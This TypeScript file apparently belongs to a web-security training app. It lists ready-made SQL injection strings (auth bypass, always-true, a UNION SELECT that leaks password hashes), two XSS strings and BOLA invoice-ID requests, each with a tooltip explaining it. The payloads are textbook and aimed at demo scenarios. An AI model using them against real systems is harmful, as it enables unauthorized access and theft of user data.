/**
 * payloads.ts
 *
 * Pre-built attack payloads for each scenario, shaped to match
 * the props PayloadChip expects: { label, payload }.
 *
 * - sqli / xss: `payload` is inserted into the text field that feeds the API.
 * - bola:        `payload` is the invoice ID string (as BolaScenario uses it),
 *                with `asUser` as the companion field to set alongside it.
 */

export type ScenarioKey = "sqli" | "xss" | "bola";

/** Shape consumed by <PayloadChip payload={p.payload} label={p.label} /> */
export interface Payload {
  /** Short human-readable name shown in the chip label area */
  label: string;
  /** The value injected into the relevant input field */
  payload: string;
  /** Optional tooltip / title attribute for the chip */
  title?: string;
}

/** BOLA payloads carry an extra `asUser` so the scenario can set both fields */
export interface BolaPayload extends Payload {
  asUser: string;
}

export const sqliPayloads: Payload[] = [
  {
    label: "Auth bypass",
    payload: "alice'--",
    title: "Comments out the password check: WHERE username = 'alice'--' AND password = '...'",
  },
  {
    label: "Always true",
    payload: "' OR '1'='1",
    title: "Makes the WHERE clause always evaluate to true",
  },
  {
    label: "UNION extract",
    payload: "' UNION SELECT username, password_hash, null, null FROM users --",
    title: "Appends a second SELECT to leak the users table into the result",
  },
];

export const xssPayloads: Payload[] = [
  {
    label: "Script tag",
    payload: "<script>alert('XSS')</script>",
    title: "Classic script injection \u2014 executes alert() when the comment is rendered",
  },
  {
    label: "Img onerror",
    payload: "<img src=x onerror=alert(1)>",
    title: "Broken image triggers onerror handler \u2014 no closing tag needed",
  },
];

export const bolaPayloads: BolaPayload[] = [
  {
    label: "Alice's invoice",
    payload: "101",
    asUser: "alice",
    title: "Invoice 101 belongs to Alice ($500) \u2014 legitimate access",
  },
  {
    label: "Bob's invoice as Alice",
    payload: "102",
    asUser: "alice",
    title: "Invoice 102 belongs to Bob ($750) \u2014 BOLA exploit target",
  },
];

/** Convenience lookup by scenario key */
export const payloads: Record<"sqli" | "xss", Payload[]> & { bola: BolaPayload[] } = {
  sqli: sqliPayloads,
  xss:  xssPayloads,
  bola: bolaPayloads,
};

export default payloads;
